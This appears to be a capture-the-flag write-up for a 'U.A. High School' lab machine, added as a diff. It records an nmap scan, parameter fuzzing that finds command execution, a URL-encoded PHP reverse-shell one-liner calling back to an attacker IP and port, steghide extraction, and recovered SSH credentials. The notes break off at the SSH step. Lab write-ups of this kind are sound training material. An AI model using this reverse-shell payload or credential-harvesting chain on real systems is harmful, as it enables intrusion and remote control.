@@ -1,0 +1,57 @@
+# Nmap:
+kali@kali:~/Downloads$ nmap -T4 -O -A 10.10.109.110
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 16:12 IST
+Nmap scan report for 10.10.109.110
+Host is up (0.21s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
+|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
+|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: U.A. High School
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+
+# FINDS:
+
+    Principal Nezu
+    Dean Vlad King
+    Professor Shota Aizawa
+    Professor Toshinori Yagi
+    Professor Hizashi Yamada
+    Professor Emi Fukuka
+
+There was a PHPSSID : hence there might esist a php file
+PHPSESSID :: mvsupagvgoo1cqe4r4bnfeqt91
+
+WE TRIED TO GO TO /assets GOT  THE BLANK PAGE:
+WE TRIED TO FUZZ THE /assets AND GOT THE /index.php
+further fuzzing:
+ffuf -u "http://10.10.221.12/assets/index.php?FUZZ" -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0
+
+WE GOT ?cmd=id
+
+We got the local file inclusion.
+
+We will use the following to get the reverse shell :
+php%20-r%20%27%24sock%3Dfsockopen%28%2210.21.129.108%22%2C4444%29%3Bshell_exec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%
+
+#
+There was another interestinf thing in the www folder ::::
+Allmightforever!!!
+
+We Got the images in the /images folder
+one of the images was corrupted and needed to be fixed , 
+fixed the magic bytes using the hex-editor
+
+the Tool: "steghide" was used to extract the data from the image:
+
+When extracting the data from hte image , the Allmightforever phrase wash use as the paraphrase:
+Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
+
+deku:One?For?All_!!one1/A
+
+#
+Ssh to the deku:
